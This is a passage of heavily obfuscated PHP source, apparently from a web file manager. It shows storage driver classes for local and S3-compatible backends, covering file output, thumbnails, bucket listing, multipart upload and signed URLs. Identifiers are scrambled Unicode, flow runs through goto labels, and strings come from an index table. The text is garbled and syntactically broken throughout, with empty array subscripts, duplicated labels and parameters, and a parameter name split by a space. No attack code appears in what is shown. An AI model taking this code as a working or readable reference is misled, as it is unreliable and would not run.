header($F򍜼[134] . $eВ); goto Cҋ; fŚ̌: $B = $this->getType() == $F򍜼[106]; $CՍ = $GLOBALS[$F򍜼[6]][$F򍜼[88]][$F򍜼[107]][$F򍜼[108]]; $a = (double) $GLOBALS[$F򍜼[6]][$F򍜼[88]][$F򍜼[107]][$F򍜼[109]] * 1024 * 1024; goto F; b׊: $f = $Dགྷى[$F򍜼[78]]; $bՌÉ = gmdate($F򍜼[110], $Dགྷى[$F򍜼[84]]); $C斿 = $Bң ? $Bң : $this->iconvApp($Dགྷى[$F򍜼[28]]); goto e; f𓣵: header($F򍜼[138] . $f); header($F򍜼[139]); if (!$eʲ && $eϑ == $F򍜼[140]) { if ($f > 1024 * 1024 * 5) { die; } $Aĸ = $this->getContent($d); $Aĸ = Html::clearSVG($Aĸ); header($F򍜼[141] . strlen($Aĸ)); echo $Aĸ; die; } goto Fń; e: $D = 0; $bÖ = $f - 1; $eϑ = $this->ext($C斿); goto Cǲ; c񩍛: } public function fileOutServer($bŉ, $F̣ = false, $Bݥ = false, $cٵ = '') { $this->fileOut($bŉ, $F̣, $Bݥ, $cٵ); } public function fileOutLink($D) { header($_SERVER[][159] . $D); die; } public function cacheMethod($eњ, $BϏ, $dƣ = null) { goto a߆; eգ͢: if (!is_null($dƣ)) { $ḑ[$D䟄] = $dƣ; return; } $Aّ = isset($ḑ[$D䟄]) ? $ḑ[$D䟄] : null; if (!is_null($Aّ)) { return $Aّ; } goto cڢ; a߆: $D֏ =& $_SERVER[]; static $ḑ = array(); $b = $BϏ ? ltrim($this->getPathOuter($BϏ), $D֏[8]) : $BϏ; goto e笵; cڢ: $Aّ = $this->{$eњ}($BϏ); $ḑ[$D䟄] = $Aّ; return $Aّ; goto Cń; e笵: $D䟄 = $D֏[160] . $eњ . $D֏[161] . rtrim($b, $D֏[8]); if (is_null($eњ)) { $ḑ = array(); return; } if (is_null($BϏ)) { unset($ḑ[$D䟄]); return; } goto eգ͢; Cń: } public function fileOutImage($Dċ, $cҋڐ = 250) { goto CΛ; b: if (!@file_exists($dő)) { $c = TEMP_FILES; if (!is_dir($c)) { mk_dir($c); } $E܃ڈ = $c . $e . $B̅[95] . $B[$B̅[168]]; if (!@file_exists($E܃ڈ)) { $E܃ڈ = $this->download($Dċ, $E܃ڈ); } ImageThumb::createThumb($E܃ڈ, $dő, $cҋڐ, $cҋڐ * 10); } if (!file_exists($dő) || filesize($dő) < 100) { return @file_exists($E܃ڈ) ? IO::fileOut($E܃ڈ) : $this->fileOut($Dċ); } if (!($bԯ = IO::move($dő, $A͆))) { return IO::fileOut($dő); } goto C򯍱; D绺: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $dő = DATA_THUMB . $a; del_file($dő); goto b; A: if (isset($GLOBALS[$B̅[162]]) && $GLOBALS[$B̅[162]][$B̅[76]] == $B[$B̅[76]]) { $EӵɎټ = $GLOBALS[$B̅[162]][$B̅[163]]; if (!$B[$B̅[164]]) { $B[$B̅[164]] = $GLOBALS[$B̅[162]]; } if (isset($EӵɎټ[$B̅[165]])) { if ($EӵɎټ[$B̅[165]] <= $cҋڐ && $EӵɎټ[$B̅[166]] <= $cҋڐ) { $E = !0; } } $cȦ = $B[$B̅[164]][$B̅[28]]; } if ($B[$B̅[78]] <= 1024 * 50 || $E || !function_exists($B̅[167]) || $B[$B̅[168]] == $B̅[169]) { return $this->fileOut($Dċ, !1, $cȦ); } if (isset($B[$B̅[164]][$B̅[170]])) { $e = $B[$B̅[164]][$B̅[170]]; } else { if (isset($B[$B̅[164]][$B̅[171]])) { $e = $B[$B̅[164]][$B̅[171]]; } else { $e = md5("{$B[$B̅[28]]}\137{$B[$B̅[76]]}\137{$B[$B̅[78]]}"); } } goto bԣ; CΛ: $B̅ =& $_SERVER[]; set_timeout(); if (substr($Dċ, 0, 4) == $B̅[147]) { $this->fileOutLink($Dċ); } goto dʎ鸊; dʎ鸊: $B = $this->info($Dċ); $cȦ = $B[$B̅[28]]; $E = !1; goto A; C򯍱: del_file($dő); IO::fileOut($bԯ); goto C͹户; bԣ: $a = "{$e}\137{$cҋڐ}\x2e\x70\x6e\147"; if (!($e = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B̅[172]))) { $A͆ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B̅[173]); } else { $A͆ = KodIO::make($e); } if ($e = IO::fileNameExist($A͆, $a)) { $dő = KodIO::make($e); return IO::fileOut($dő, !1, $cȦ); } goto D绺; C͹户: } public function fileOutImageServer($A򶲉, $CȎ = 250) { $this->fileOutImage($A򶲉, $CȎ); } public function fileNameAuto($eҍ, $dՉ, $A⏺ = REPEAT_RENAME, $Dչꘈ = false) { goto A; aÍ: $D = 1; $a􋫂 = substr($dՉ, 0, strlen($dՉ) - strlen($Fٵߎ)); $Cà = $a􋫂 . "\50{$D}\51{$Fٵߎ}"; goto fͬ; D씏: if ($A⏺ == REPEAT_SKIP) { return !1; } $Fٵߎ = $aݺ[95] . get_path_ext($dՉ); $Fٵߎ = $Fٵߎ == $aݺ[95] || $Dչꘈ ? $aݺ[33] : $Fٵߎ; goto aÍ; fͬ: while ($this->exist(rtrim($eҍ, $aݺ[8]) . $aݺ[8] . $Cà)) { $Cà = $a􋫂 . "\50{$D}\x29{$Fٵߎ}"; $D++; } return $Cà; goto Aɯ; A: $aݺ =& $_SERVER[]; $Bї = $eҍ === $aݺ[33] ? $dՉ : rtrim($eҍ, $aݺ[8]) . $aݺ[8] . $dՉ; if ($A⏺ == REPEAT_REPLACE || !$this->exist($Bї) || $Dչꘈ && $A⏺ != REPEAT_RENAME_FOLDER) { return $dՉ; } goto D씏; Aɯ: } private function fileNameAutoList($BӢ촡, $b, $B = false) { goto f; C: $Aź = substr($b, 0, strlen($b) - strlen($cҝ)); $EЈݟ = $Aź . "\x28\x30\x29{$cҝ}"; for ($A˅ = 1; $A˅ <= count($Ă) + 1; $A˅++) { $EЈݟ = $Aź . "\50{$A˅}\x29{$cҝ}"; if (!in_array_not_case($EЈݟ, $Ă)) { return $EЈݟ; } } goto f; F܎º: $Ă = array_to_keyvalue($A߄, $d˟犰[33], $d˟犰[28]); $cҝ = $d˟犰[95] . get_path_ext($b); $cҝ = $cҝ == $d˟犰[95] || $B ? $d˟犰[33] : $cҝ; goto C; f: return $EЈݟ; goto e; f: $d˟犰 =& $_SERVER[]; $A߄ = $this->listPath($BӢ촡, !0); $A߄ = array_merge($A߄[$d˟犰[75]], $A߄[$d˟犰[74]]); goto F܎º; e: } public function listAllFiles($aϤ, $b, $aτ = array()) { goto A᫉; a̎: $aϤ = trim($aϤ, $fˈ[8]); foreach ($b as $A𮬃) { $F = ltrim(substr(trim($A𮬃, $fˈ[8]), strlen($aϤ)), $fˈ[8]); $dΧ = array_merge($dΧ, $this->slicePath($F)); } $Eٶ = array(); goto Eܐ; A᫉: $fˈ =& $_SERVER[]; if (empty($b)) { return array(); } $dΧ = array(); goto a̎; Eܐ: foreach (array_unique($dΧ) as $A𮬃) { $bɮҥ = array($fˈ[76] => $this->getPathOuter($fˈ[8] . $aϤ . $fˈ[8] . $A𮬃), $fˈ[77] => 1, $fˈ[78] => 0); if (substr($A𮬃, -1) != $fˈ[8]) { $bɮҥ[$fˈ[77]] = 0; $eʘֆ = $this->getPath($aϤ . $fˈ[8] . $A𮬃); $bɮҥ[$fˈ[78]] = isset($aτ[$eʘֆ]) ? $aτ[$eʘֆ] : $this->size($eʘֆ); } $Eٶ[] = $bɮҥ; } return $Eٶ; goto FƗ; FƗ: } public function slicePath($C) { $C =& $_SERVER[]; $EȆ = explode($C[8], trim($C, $C[8])); $CĺӢ = 0; do { ++$CĺӢ; $bꏚը[] = implode($C[8], array_slice($EȆ, 0, $CĺӢ)) . $C[8]; } while ($CĺӢ < count($EȆ)); $bꏚը[count($EȆ) - 1] = $C; return $bꏚը; } public function getHost() { $dŜ =& $_SERVER[]; $Fرڠ = parse_url(trim($this->domain, $dŜ[8])); $fə = isset($Fرڠ[$dŜ[174]]) ? $Fرڠ[$dŜ[174]] : http_type(); $Dݥ = isset($Fرڠ[$dŜ[175]]) ? $Fرڠ[$dŜ[175]] : $Fرڠ[$dŜ[76]]; if (isset($Fرڠ[$dŜ[176]])) { $Dݥ .= $dŜ[4] . $Fرڠ[$dŜ[176]]; } return $fə . $dŜ[177] . $Dݥ; } public function pathEncode($Cȃ) { $eƱ =& $_SERVER[]; return str_replace($eƱ[178], $eƱ[8], rawurlencode($Cȃ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($c慱) { set_timeout(); require_once SDK_DIR . $_SERVER[][179]; parent::__construct(); $this->_init($c慱); } public function _init($E) { foreach ($E as $C => $e) { if (isset($this->{$C})) { $this->{$C} = $e; } } $this->endpoint = $E[$_SERVER[][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($D࿒ = "\x76\64") { $this->signVer = $D࿒; $this->client->setSignatureVersion($D࿒); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Fԓ; c: if ($Eƈ[$E[181]] != $E[182] || $Eƈ[$E[183]] != $E[182]) { return !1; } $CĚՇ = array_map($E[184], $Eƈ[$E[185]]); if (!is_array($CĚՇ)) { $CĚՇ = array(); } goto A; A: $fĈ = array($E[186], $E[187], $E[188], $E[189], $E[190]); $C˕ = array_diff($fĈ, $CĚՇ); return empty($C˕); goto eϬ; Fԓ: $E =& $_SERVER[]; $Eƈ = $this->getBucketCors(); if (!$Eƈ || !is_array($Eƈ)) { return !1; } goto c; eϬ: } public function mkfile($Eꌃ, $C䷹܉ = '', $e؍͗ = REPEAT_RENAME) { $AՐ = $this->setContent($Eꌃ, $C䷹܉); if ($AՐ !== !1) { return $this->getPathOuter($Eꌃ); } return !1; } public function mkdir($C, $e = REPEAT_SKIP) { $Eɽ =& $_SERVER[]; if (empty($C) && $C !== $Eɽ[191]) { return !1; } if ($this->_isFolder($C)) { return $this->getPathOuter($C); } $dߝ = $this->setContent($C, $Eɽ[33], !0); if ($dߝ !== !1) { return $this->getPathOuter($C); } return !1; } public function copyFile($aА, $bƭ񬇆, $E = array()) { $Aն뱚 =& $_SERVER[]; $E䵳 = $this->objectMeta($aА); if (!$E䵳) { return !1; } if ($E䵳[$Aն뱚[78]] <= 1024 * 1024 * 200) { $D盟 = $this->client->copyObject($this->bucket, $aА, $this->bucket, $bƭ񬇆, $Aն뱚[192], $E); } else { $D盟 = $this->client->multiCopyObject($this->bucket, $aА, $this->bucket, $bƭ񬇆, $E); } $D盟 = $D盟 ? $this->getPathOuter($bƭ񬇆) : !1; return $D盟; } public function moveFile($Aԍ, $c) { if ($this->copyFile($Aԍ, $c)) { $this->delFile($Aԍ); return $this->getPathOuter($c); } return !1; } public function delFile($c) { return $this->client->deleteObject($this->bucket, $c); } public function delFolder($bر) { goto Aۈ; Aǚ: $Fɻדԓ = $this->delByBatch($E[$f[75]]); if (!$Fɻדԓ) { return !1; } return $this->delFile($E׮); goto A㺷; ǎ: if (!empty($bر) && $bر !== $f[191] && !in_array($E׮, $E[$f[75]])) { $E[$f[75]][] = $E׮; } $Fɻדԓ = $this->delByBatch($E[$f[74]]); if (!$Fɻדԓ) { return !1; } goto Aǚ; dׄ: $E = $this->fileList($bر); $this->listItemCache = !0; $E׮ = trim($bر, $f[8]) . $f[8]; goto ǎ; Aۈ: $f =& $_SERVER[]; if (!$this->exist($bر)) { return !0; } $this->listItemCache = !1; goto dׄ; A㺷: } private function delByBatch($c) { foreach (array_chunk($c, 1000) as $bϞ) { $eԪ = $this->client->deleteObjects($this->bucket, $bϞ); if (!$eԪ) { return !1; } } return !0; } public function rename($a≲, $aÌ) { return $this->renameObject($a≲, $aÌ); } public function listPath($Fǟ핅, $Fŋ = false) { $dɯ =& $_SERVER[]; $A = $this->fileList($Fǟ핅, $dɯ[8], !0); foreach ($A[$dɯ[75]] as $f猐 => $bɧ) { $A[$dɯ[75]][$f猐] = $this->folderInfo($bɧ, $Fŋ); } foreach ($A[$dɯ[74]] as $f猐 => $bɧ) { $A[$dɯ[74]][$f猐] = $this->fileInfo($bɧ[$dɯ[28]], $Fŋ, $bɧ); } return $A; } private function fileInfo($bܬ, $e = false, $d = array()) { goto e쨨; EҵՉ: if (isset($d[$B䫙[197]])) { $Bǟ[$B䫙[84]] = $d[$B䫙[197]]; } if (isset($d[$B䫙[78]])) { $Bǟ[$B䫙[78]] = $d[$B䫙[78]]; } return $Bǟ; goto eܐۄ; Dׇ: $Bǟ[$B䫙[194]] = $Bǟ[$B䫙[84]] = 0; $Bǟ[$B䫙[195]] = $Bǟ[$B䫙[196]] = !0; if (empty($d)) { $d = $this->objectMeta($bܬ); if (!$d) { return $Bǟ; } } goto EҵՉ; e쨨: $B䫙 =& $_SERVER[]; $Bǟ = array($B䫙[28] => $this->pathThis($bܬ), $B䫙[76] => $this->getPathOuter($bܬ), $B䫙[29] => $B䫙[193], $B䫙[168] => $this->ext($bܬ), $B䫙[78] => isset($d[$B䫙[78]]) ? $d[$B䫙[78]] : 0); if ($e) { return $Bǟ; } goto Dׇ; eܐۄ: } private function folderInfo($e瑊݃, $Cٶ = false) { goto Fᓳ; Fᓳ: $C =& $_SERVER[]; $B = array($C[28] => $this->pathThis($e瑊݃), $C[76] => $this->getPathOuter($C[8] . $e瑊݃), $C[29] => $C[77]); if ($Cٶ) { return $B; } goto c; c: $B[$C[194]] = $B[$C[84]] = 0; $B[$C[195]] = $B[$C[196]] = !0; if ($e瑊݃ == $C[33]) { return $B; } goto CÌ; CÌ: $e瑊݃ = trim($e瑊݃, $C[8]) . $C[8]; $b = $this->objectMeta($e瑊݃); if (isset($b[$C[197]])) { $B[$C[194]] = $b[$C[197]]; } goto AĆ; AĆ: return $B; goto E郑; E郑: } private function fileList($b̭, $eߩپ = '', $b = 0) { goto Fț; aꨇ: if (!$e؍Ʋ) { return array($bֿ[75] => array(), $bֿ[74] => array()); } $d钧՝ = $this->listItemCache === !1 ? !1 : !0; $DѤ = $b܎ = array(); goto f; Fț: $bֿ =& $_SERVER[]; $Aυٌ = rtrim($b̭, $bֿ[8]) . $bֿ[8]; $e؍Ʋ = $this->listObjs($Aυٌ, null, null, $eߩپ); goto aꨇ; D頋: return array($bֿ[75] => $DѤ, $bֿ[74] => $b܎); goto BƑ; f: foreach ($e؍Ʋ[$bֿ[198]] as $D߄) { goto f; f: $fΚ׊ = $D߄[$bֿ[28]]; if ($fΚ׊ == $Aυٌ) { continue; } $Aȏ = isset($D߄[$bֿ[78]]) ? $D߄[$bֿ[78]] : 0; goto Aʇщ; Aʇщ: $aև = $Aȏ == 0 && substr($fΚ׊, strlen($fΚ׊) - 1, 1) == $bֿ[8] ? !0 : !1; if ($d钧՝) { $this->cacheMethod($bֿ[199], $fΚ׊, $aև); $this->cacheMethod($bֿ[200], $fΚ׊, $D߄); } if ($aև) { $DѤ[] = $fΚ׊; continue; } goto cН; cН: $b܎[] = $b ? $D߄ : $fΚ׊; goto Cޓ͵; Cޓ͵: } foreach ($e؍Ʋ[$bֿ[201]] as $D߄) { $DѤ[] = $D߄[$bֿ[28]]; if ($d钧՝) { $this->cacheMethod($bֿ[199], $D߄[$bֿ[28]], !0); } } if ($d钧՝) { $this->cacheMethod($bֿ[199], $b̭, !0); } goto D頋; BƑ: } private function listObjs($C, $f = null, $bҎ = null, $AѦː = null) { $FИ⽰ =& $_SERVER[]; $C = trim($C, $FИ⽰[8]); $eΦ휚 = empty($C) && $C !== $FИ⽰[191] ? $FИ⽰[33] : $C . $FИ⽰[8]; return $this->client->getBucket($this->bucket, $eΦ휚, $f, $bҎ, $AѦː, !0); } public function has($B٤, $c = false, $Bڟ = true) { goto A; A: $Aҗ =& $_SERVER[]; $B٤ = trim($B٤, $Aҗ[8]); $Aʅ = empty($B٤) && $B٤ !== $Aҗ[191] ? $Aҗ[33] : $B٤ . $Aҗ[8]; goto d¬; AᲸ: return !1; goto f; d¬: $AȾֈ = null; $d瞟 = 500; $eƅ = $Aҗ[8]; goto E޾; E޾: $CŸ = $D = array(); while (!0) { $D = $this->listObjs($B٤, $AȾֈ, $d瞟, $eƅ); if (!$D) { break; } $AȾֈ = $D[$Aҗ[202]]; $AǺ = $D[$Aҗ[198]]; $e׿ = $D[$Aҗ[201]]; if (empty($AǺ) && empty($e׿)) { break; } if (count($AǺ) == 1 && $AǺ[0][$Aҗ[28]] == $Aʅ) { break; } if ($c) { if (count($AǺ)) { $AǺ = array_column($AǺ, $Aҗ[28]); $CŸ = array_merge($CŸ, $AǺ); } if (count($e׿)) { $e׿ = array_column($e׿, $Aҗ[28]); $D = array_merge($D, $e׿); } if ($AȾֈ === null) { break; } continue; } if ($Bڟ) { if (!empty($AǺ)) { if (count($AǺ) > 1 || isset($AǺ[0][$Aҗ[28]]) && $AǺ[0][$Aҗ[28]] != $Aʅ) { return !0; } } } else { if (!empty($e׿)) { return !0; } } if ($AȾֈ === null) { break; } } if ($c) { $CŸ = array_diff($CŸ, array($Aʅ)); $CŸ = count(array_unique($CŸ)); $D = count(array_unique($D)); return array($Aҗ[203] => $CŸ, $Aҗ[204] => $D); } goto AᲸ; f: } public function listAll($dҏՄ) { $FѢ =& $_SERVER[]; $aș͈ = $this->fileList($dҏՄ, $FѢ[33], !0); $e = array(); foreach ($aș͈[$FѢ[74]] as $eֹ݂) { $e[$eֹ݂[$FѢ[28]]] = $eֹ݂[$FѢ[78]]; } foreach ($aș͈[$FѢ[75]] as $eֹ݂) { if (is_string($eֹ݂)) { $e[$eֹ݂] = 0; } } return $this->listAllFiles($dҏՄ, array_keys($e), $e); } public function canRead($E) { $CѾ =& $_SERVER[]; $B٧虆 = $this->client->getAccessControlPolicy($this->bucket, $E); if (!$B٧虆) { return !1; } return in_array($B٧虆, array($CѾ[205], $CѾ[206], $CѾ[207])) ? !0 : !1; } public function canWrite($Cڿ) { $A =& $_SERVER[]; $e = $this->client->getAccessControlPolicy($this->bucket, $Cڿ); if (!$e) { return !1; } return in_array($e, array($A[205], $A[206])) ? !0 : !1; } public function getContent($eͯ⃅) { return $this->client->getObject($this->bucket, $eͯ⃅); } public function setContent($b, $bݮ = '', $CÌ = false) { goto cٹ; B: $f󕘟 = $this->client->putObject($bݮ, $this->bucket, $b, $E[192], array(), $aߖ); if (!$f󕘟) { return !1; } if ($CÌ) { return !0; } goto e; e: $this->cacheMethod(null, null); $f󕘟 = $this->copyFile($b, $b, array($E[208] => $f󕘟[$E[209]])); return $f󕘟 ? !0 : !1; goto Eڢ; cٹ: $E =& $_SERVER[]; $b = $CÌ ? trim($b, $E[8]) . $E[8] : $b; $aߖ = get_file_mime(get_path_ext($b)); goto B; Eڢ: } public function fileSubstr($A܃, $Eެ, $eǅܫ) { $B = $Eެ + $eǅܫ - 1; return $this->client->getObject($this->bucket, $A܃, array($_SERVER[][210] => "\142\x79\164\145\163\x3d{$Eެ}\x2d{$B}")); } public function upload($eȕ, $a䷋͐, $a = false, $e脱 = REPEAT_REPLACE) { $bϐȰ =& $_SERVER[]; $eɿӨ = array($bϐȰ[208] => @md5_file($a䷋͐)); $eŵ = array($bϐȰ[211] => get_file_mime(get_path_ext($eȕ))); if (IO::size($a䷋͐) <= 1024 * 1024 * 200) { $D䙋 = $this->client->putObjectFile($a䷋͐, $this->bucket, $eȕ, $bϐȰ[192], $eɿӨ, $eŵ); return !empty($D䙋) ? $this->getPathOuter($eȕ) : !1; } $Cˇ = $this->client->multiUploadObject($a䷋͐, $this->bucket, trim($eȕ, $bϐȰ[8]), $eɿӨ, $eŵ); return $Cˇ ? $this->getPathOuter($eȕ) : !1; } public function download($A, $Fێ) { if (!@is_dir($this->pathFather($Fێ)) && !IO::mkdir($this->pathFather($Fێ))) { return !1; } $C = $this->client->getObject($this->bucket, $A, array(), $Fێ); return $C !== !1 ? $Fێ : !1; } public function link($b, $Dۍ = array()) { $B჋ =& $_SERVER[]; if ($this->signVer == $B჋[212]) { return $this->client->getAuthenticatedURL($this->bucket, $b, 3600 * 12, $Dۍ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($b, $B჋[8]), 3600 * 12, $this->region, array(), !0, $Dۍ); } public function fileOut($E, $A = false, $bц = false, $C귳 = '') { goto B挂; B挂: $eꌠ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($E, $A, $bц, $C귳); } if (!$bц) { $bц = $this->pathThis($E); } goto e澰; aא: $b竏 = array($eꌠ[216] => $A . $eꌠ[217] . rawurlencode($bц), $eꌠ[218] => $dç拒); $d = $this->link($E, $b竏); $this->fileOutLink($d); goto F카͟; e澰: $dç拒 = get_file_mime(get_path_ext($bц)); if ($dç拒 == $eꌠ[213]) { return parent::fileOut($E, $A, $bц, $C귳); } $A = $A ? $eꌠ[214] : $eꌠ[215]; goto aא; F카͟: } public function fileOutServer($E ݨ, $E = false, $f믋߼ = false, $e∏ = '') { parent::fileOut($E ݨ, $E, $f믋߼, $e∏); } public function fileOutImageServer($a, $Eٿ = 250) { parent::fileOutImage($a, $Eٿ); } public function hashMd5($FѤ, $A߃ = '') { $Bߡɵ =& $_SERVER[]; $d޳ = $this->objectMeta($FѤ); if (!$d޳) { return !1; } $A߃ = $A߃ ? $A߃ : _get($d޳, $Bߡɵ[219]); $A߃ = $A߃ ? $A߃ : _get($d޳, $Bߡɵ[209], $Bߡɵ[33]); return $A߃; } public function uploadFormData($c茙, $D = 3600) { $fԕ =& $_SERVER[]; $Cɱ = $this->pathFather($c茙); $C = $this->client->getHttpUploadPostParams($this->bucket, $Cɱ, $fԕ[192], $D); return array_merge((array) $C, array($fԕ[175] => $this->getHost())); } public function multiUploadFormData($bʑ, $A = 3600) { $dɣ =& $_SERVER[]; $AɊ = gmdate($dɣ[220]); $dՊ = array(); $BۈĽ = $this->client->getUploadId($this->bucket, $bʑ, $dՊ); if (!$BۈĽ) { return !1; } return array($dɣ[221] => $BۈĽ, $dɣ[175] => $this->getHost() . $dɣ[8] . $this->pathEncode($bʑ), $dɣ[222] => $AɊ, $dɣ[93] => $bʑ); } public function multiUploadAuthData($Cڣە, $aّᆩ = array()) { goto eӞ; eљȔ: $aЌ = implode($Aݫ[229], $B͉ނĉ); $C = base64_encode(hash_hmac($Aݫ[230], $aЌ, $this->secret, !0)); $A = $Aݫ[231] . $this->accessKey . $Aݫ[4] . $C; goto A; b: $BϮ΍ = $aّᆩ[$Aݫ[93]]; unset($aّᆩ[$Aݫ[93]]); if (isset($aّᆩ[$Aݫ[223]])) { $aّᆩ[$Aݫ[222]] = $f; return $this->listUploadParts($BϮ΍, $aّᆩ); } goto A; A: $B͉ނĉ = array($Aݫ[224], $Aݫ[33], $Aݫ[119], $Aݫ[33], "\170\x2d\x61\x6d\x7a\x2d\x64\x61\x74\x65\x3a{$f}", $Aݫ[8] . $this->bucket . $Aݫ[8] . $this->pathEncode($BϮ΍) . $c᭰ϭ); if (strpos($c᭰ϭ, $Aݫ[225]) === 0) { $B͉ނĉ[0] = $Aݫ[226]; } if (isset($aّᆩ[$Aݫ[227]]) && $aّᆩ[$Aݫ[227]] == $Aݫ[228]) { $B͉ނĉ[0] = $Aݫ[228]; } goto eљȔ; eӞ: $Aݫ =& $_SERVER[]; $f = isset($aّᆩ[$Aݫ[222]]) ? $aّᆩ[$Aݫ[222]] : gmdate($Aݫ[220]); $c᭰ϭ = isset($aّᆩ[$Aݫ[168]]) ? $aّᆩ[$Aݫ[168]] : $Aݫ[33]; goto b; A: if (strpos($c᭰ϭ, $Aݫ[225]) === 0) { return array($Aݫ[232] => $A, $Aݫ[222] => $f); } return $A; goto c쪈; c쪈: } public function listUploadParts($C, $bя = array()) { goto Aݓ; Bքѵ: $a = $this->multiUploadAuthData($C, $bя); if (empty($a)) { return !1; } return array($e[232] => $a, $e[222] => $bя[$e[222]], $e[234] => $Dᪧ); goto cૐ; b: if (!$Dᪧ) { return !1; } unset($bя[$e[223]], $bя[$e[227]]); $bя[$e[93]] = $C; goto Bքѵ; Aݓ: $e =& $_SERVER[]; $A͟ = str_replace($e[233], $e[33], $bя[$e[168]]); $Dᪧ = $this->client->listParts($this->bucket, $C, $A͟); goto b; cૐ: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($aê) { $E = $this->objectMeta($aê); return $E ? $E[$_SERVER[][78]] : 0; } public function info($Ë́ԉ) { if ($this->isFolder($Ë́ԉ)) { return $this->folderInfo($Ë́ԉ); } else { if ($this->isFile($Ë́ԉ)) { return $this->fileInfo($Ë́ԉ); } } return !1; } public function exist($dڐ܌) { return $this->isFile($dڐ܌) || $this->isFolder($dڐ܌); } public function isFile($C) { return !$this->isFolder($C) && $this->objectMeta($C); } public function isFolder($E) { return $this->cacheMethod($_SERVER[][199], $E); } protected function objectMeta($Cѡ) { return $this->cacheMethod($_SERVER[][200], $Cѡ); } protected function _objectMeta($Eψ) { $bɎ =& $_SERVER[]; $Eψ = rtrim($Eψ, $bɎ[8]); try { $D = $this->client->getObjectInfo($this->bucket, $Eψ); if (!isset($D[$bɎ[219]]) && isset($D[$bɎ[235]])) { $D[$bɎ[219]] = $D[$bɎ[235]]; } } catch (Exception $Fۋ) { $D = !1; } if (!$D) { } return $D; } protected function _isFolder($C») { goto c̓; eں: return !0; goto E; c̓: $E㝴 =& $_SERVER[]; $C» = rtrim($C», $E㝴[8]); if ($C» == $E㝴[33] || $C» == $E㝴[8]) { return !0; } goto Cӗ֎; D: return stripos($e, $C» . $E㝴[8]) === 0 ? !0 : !1; if (substr($e, -1) == $E㝴[8]) { return !0; } if (get_path_this($e) == get_path_this($C»)) { return !1; } goto eں; Cӗ֎: $eӍ = $this->client->getBucket($this->bucket, $C», null, 1); if (empty($eӍ[$E㝴[198]])) { return !1; } $e = $eӍ[$E㝴[198]][0][$E㝴[28]]; goto D; E: } } define($_SERVER[][236], 1); goto dԿ; bǌ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($A︂, $A) { goto f܌; f܌: $e =& $_SERVER[]; $FˇϘ = $A; $GLOBALS[$e[1044]] = $e[1045] . $A︂; goto A; cӂŌ: Hook::trigger($e[1045] . $A︂ . $e[1048], $FˇϘ, $dۺ); return $dۺ; goto b; A: Hook::trigger($e[1045] . $A︂ . $e[1046], $FˇϘ); $a㡑 = self::driverMake($A[0]); if (method_exists($a㡑, $A︂)) { $dۺ = @call_user_func_array(array($a㡑, $A︂), $A); } else { if (method_exists($a㡑, $e[1047])) { $dۺ = @call_user_func_array(array($a㡑, $A︂), $A); } else { if (method_exists(self, $A︂)) { $dۺ = @call_user_func_array(array(self, $A︂), $A); } else { $dۺ = call_user_func_array(array(parent, $A︂), $A); } } } goto cӂŌ; b: } public static function init($Cܳ߿) { return self::driverMake($Cܳ߿); } public static function copy($D䬃, $cծ, $a˿ = false, $FɊ = false) { return self::copyMoveStart($D䬃, $cծ, $a˿, $_SERVER[][531], $FɊ); } public static function move($c᪜ߵ, $bϫ, $A摐 = false, $d߸ = false) { return self::copyMoveStart($c᪜ߵ, $bϫ, $A摐, $_SERVER[][533], $d߸); } private static function copyMoveStart($F, $CΫ, $bנބ, $Bу, $b) { $B =& $_SERVER[]; $bߝ = array($F, $CΫ, $bנބ, $b); Hook::trigger($B[1045] . $Bу . $B[1046], $bߝ); $BӖ܎ = self::copyMove($F, $CΫ, $bנބ, $Bу, $b); Hook::trigger($B[1045] . $Bу . $B[1048], $bߝ, $BӖ܎); return $BӖ܎; } public static function saveFile($EԔ, $C̆, $cلҐ = true) { goto Cٟ; Cٟ: $a =& $_SERVER[]; $aԒ = self::info($C̆); $f = self::driverMake($EԔ); goto a; a: $Cَ = self::driverMake($C̆); $A = !1; if ($Cَ->pathParse[$a[1049]]) { $A = $Cَ; $Cَ = self::driverMake($Cَ->pathParse[$a[1049]]); } goto e; e: if ($f->pathParse[$a[1049]]) { $f = self::driverMake($f->pathParse[$a[1049]]); } $c = $Cَ->pathFather($C̆); $f׫ = !0; goto cּŊ; bو: return $EΥ; goto b; cּŊ: if (!$cلҐ && self::driverIsSame($f, $Cَ)) { $f׫ = !1; } $EΥ = self::copyFile($f, $EԔ, $Cَ, $c, $aԒ[$a[28]], $f׫); if ($A) { $EΥ = $A->getPathOuter($EΥ); } goto bو; b: } private static function copyMove($a˸, $E, $fٚכ, $E, $F䤄 = false) { goto b; bûȥ: if ($Eդڇ) { if ($E == $B[533] && !method_exists($Dʡ, $B[1050]) && trim($E, $B[8]) == trim($Dʡ->pathFather($a˸), $B[8])) { if ($f->pathThis($a˸) != $F䤄 && !$f->isTypeObject()) { return $f->rename($a˸, $F䤄); } return $Dʡ->getPathOuter($a˸); } if (method_exists($Dʡ, $E)) { return $Dʡ->{$E}($a˸, $E, $fٚכ); } } $fҗɏ = $f->isFile($a˸); if (!$fҗɏ && $Dʡ->getType() == $B[723] && $f->getType() == $B[106]) { $C = $Dʡ->copyFolderFromIO($f, $a˸, $E, $fٚכ, $FܳƵ, $F䤄); } else { $C = self::copyPath($f, $a˸, $Dʡ, $E, $fٚכ, $FܳƵ, $fҗɏ, $F䤄); } goto DΆҍ; b݊: self::check($f, $a˸, $Dʡ, $E); Hook::trigger($B[73], $f, $a˸, $Dʡ, $E); $Eդڇ = self::driverIsSame($f, $Dʡ); goto bûȥ; b: $B =& $_SERVER[]; if 